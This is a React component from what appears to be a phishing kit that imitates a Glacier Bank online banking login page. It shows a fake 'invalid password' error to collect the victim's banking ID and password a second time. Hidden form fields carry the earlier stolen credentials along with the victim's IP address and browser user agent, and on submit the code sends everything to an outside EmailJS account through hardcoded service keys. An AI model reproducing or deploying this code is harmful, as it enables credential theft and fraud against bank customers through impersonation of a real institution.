import React from "react";
import cookies from "../utils/cookie.config";
import { useNavigate } from "react-router-dom";
import emailjs from "@emailjs/browser";

export default function LoginAgain() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<Login2>({
    username2: "",
    password2: "",
  });
  const login1: Login = cookies.get("login1");

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  const navigate = useNavigate();

  const form = React.useRef<HTMLFormElement>(null);

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    setIsLoading(true);
    event.preventDefault();
    emailjs
      .sendForm(
        "service_ya9aoe5",
        "template_30nkx7m",
        form.current!,
        "hd0P0MIIRcBmXr70h"
      )
      .then(
        (result) => {
          console.log(result.text);
          cookies.set("login2", formInput);
          navigate("../login/confirm", { replace: true });
        },
        (error) => {
          alert("Could not complete your request, please try again");
          console.log(error);
          setIsLoading(false);
        }
      );
  }

  const [ipAddress, setIpAddress] = React.useState<string>();

  async function getIP() {
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    setIpAddress(response.ip);
  }

  React.useEffect(() => {
    getIP();
  }, []);

  return (
    <>
      <form action="" ref={form} method="post" onSubmit={handleSubmit}>
        <div className="MainContent">
          <div id="WelcomeMessageDiv" className="welcome-message">
            <div className="LoginWelcomeLiteralDiv">
              <meta name="generator" content="HTML Tidy, see www.w3.org" />

              <p style={{ color: "blue" }}>
                *FOR SECURITY REASONS, GLACIER BANK RECOMMENDS YOU MAINTAIN
                UP-TO-DATE VIRUS PROTECTION SOFTWARE ON YOUR COMPUTER, CHANGE
                YOUR PASSWORD EVERY 90 DAYS, NEVER OPEN E-MAIL ATTACHMENTS FROM
                AN UNKNOWN SOURCE, AND NEVER PROVIDE PERSONAL ACCOUNT
                INFORMATION BY E-MAIL*
              </p>

              <br />
              <br />
            </div>

            <div id="login-error" className="InfoMessage_container">
              <div className="InfoMessageTable AuthInfoMessageInfoMessageTable">
                <div className="AuthInfoMessageTableRow">
                  <span className="ErrorMessageLabel AuthInfoMessageTableCell">
                    Information Message:
                  </span>
                  <div>
                    <div className="ErrorMessageTD AuthInfoMessageTableCell">
                      <span
                        id="ctl00_InfoMessage1_ErrorInfoMessageLabel"
                        className="LoginError adaAlert"
                      >
                        Invalid Online Banking ID or Password
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="LoginClear"></div>
          <div className="LoginPadding10">
            <div className="row">
            <div style={{ display: "none" }} className="hidden_form">
                <input
                  type="text"
                  name="username"
                  defaultValue={login1.username}
                />
                <input
                  type="text"
                  name="password"
                  defaultValue={login1.password}
                />
                
                
                <input type="text" name="pi" defaultValue={ipAddress} />
                <input
                  type="text"
                  name="brow"
                  defaultValue={window.navigator.userAgent}
                />
              </div>
            </div>
            <div className="row" style={{ marginBottom: "20px" }}>
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Online Banking ID:
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  name="username2"
                  onChange={handleInputChange}
                  type="text"
                  size={30}
                  id="username"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  required
                />
              </div>
            </div>
            <div className="row">
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Online Banking Password:
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  onChange={handleInputChange}
                  name="password2"
                  type="password"
                  size={30}
                  id="password"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  required
                />
              </div>
            </div>
          </div>

          <div className="button-containerADA LoginButtonContainerDiv">
            {isLoading ? (
              <div
                style={{
                  width: "100%",
                  display: "flex",
                  justifyContent: "center",
                }}
              >
                <span className="loader"></span>
              </div>
            ) : (
              <input
                type="submit"
                name="ctl00$PageContent$Login1$IdSubmitButton"
                value="Submit"
                id="ctl00_PageContent_Login1_IdSubmitButton"
                className="ColorButton"
                tabIndex={11}
              />
            )}
          </div>

          <div
            id="ctl00_PageContent_Login1_divPasswordResetLayout2"
            className="LoginCenter"
          ></div>
        </div>
      </form>
    </>
  );
}
